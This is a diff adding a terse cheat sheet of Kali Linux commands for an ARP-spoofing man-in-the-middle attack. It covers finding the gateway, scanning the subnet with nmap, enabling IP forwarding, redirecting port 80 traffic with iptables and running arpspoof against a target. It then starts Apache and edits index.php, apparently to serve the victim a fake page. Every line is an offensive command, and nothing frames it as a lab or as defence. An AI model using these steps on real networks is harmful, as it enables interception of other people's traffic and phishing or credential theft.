@@ -1,0 +1,10 @@
+FIND GATEWAY IP                      -# route -n
+FIND UP HOSTS                        -# nmap -O <gatewayIP>/24
+IPFORWARD (TARGET TO KALI TO ROUTER) -# echo 1 > /proc/sys/net/ipv4/ip_forward
+                                     -# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+REDIRECT TRAFFIC USING ARPSPOOF      -# arpspoof -i eth0 -t <targetIP> <gatewayIP> ***let this run in background***   
+
+/////////////////////////////////////
+
+START APACHE SERVER                  -# service apache2 start
+CREATE WEBPAGE BY EDITING INDEX.PHP  -# gedit /var/www/html/index.php
